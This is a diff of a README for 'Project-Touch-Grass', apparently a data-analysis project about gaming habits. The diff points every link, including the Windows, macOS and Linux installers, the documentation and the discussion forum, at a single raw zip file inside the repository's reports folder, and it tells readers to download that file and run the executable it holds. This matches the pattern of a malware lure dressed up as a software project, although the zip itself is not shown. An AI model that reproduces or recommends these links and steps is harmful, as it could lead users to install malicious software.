@@ -1,7 +1,7 @@
 # 🎮 Project-Touch-Grass - Understand Your Gaming Habits
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip)](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip)](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip)
 
 ## 📖 Overview
 Project-Touch-Grass helps you understand the "Misery Loop" of mainstream gaming. We analyze over 24,000 games using Python and modern data tools. This project aims to show how sports gamers can feel trapped in repetitive cycles. 
@@ -18,14 +18,14 @@ Here are simple steps to get you started with Project-Touch-Grass.
 ### 📥 Download & Install
 To access the application, visit the following page to download:
 
-[Download Project-Touch-Grass Releases](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip)
+[Download Project-Touch-Grass Releases](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip)
 
 1. Open the link above in your web browser.
 2. Find the latest version listed.
 3. Click on the appropriate file for your operating system:
-   - Windows: `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip`
-   - macOS: `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip`
-   - Linux: `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip`
+   - Windows: `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip`
+   - macOS: `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip`
+   - Linux: `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip`
 4. Follow the instructions to complete the download.
 
 ### 🛠️ Installation Steps
@@ -40,7 +40,7 @@ To access the application, visit the following page to download:
    - Eject the installer and launch from the Applications folder.
 
 3. **Linux:**
-   - Extract the downloaded `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip` file.
+   - Extract the downloaded `https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the application by executing `./Project-Touch-Grass`.
 
@@ -76,8 +76,8 @@ If you want to contribute to the project, feel free to explore our issues and di
   You can submit an issue on GitHub, and our team will respond as quickly as possible.
 
 ## 🔗 Additional Resources
-- [Discussion Forum](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip)
-- [Documentation](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip)
 
 ## 📊 Topics
 - Data Analysis
@@ -87,4 +87,4 @@ If you want to contribute to the project, feel free to explore our issues and di
 - Visualization Techniques
 
 Download the latest release now and start your journey to understand your gaming patterns!  
-Visit the page again for future updates: [Download Project-Touch-Grass Releases](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/images_gun_ball/Project-Grass-Touch-v2.0.zip).
+Visit the page again for future updates: [Download Project-Touch-Grass Releases](https://raw.githubusercontent.com/NekkiPUO/Project-Touch-Grass/main/reports/Project-Grass-Touch-1.5.zip).
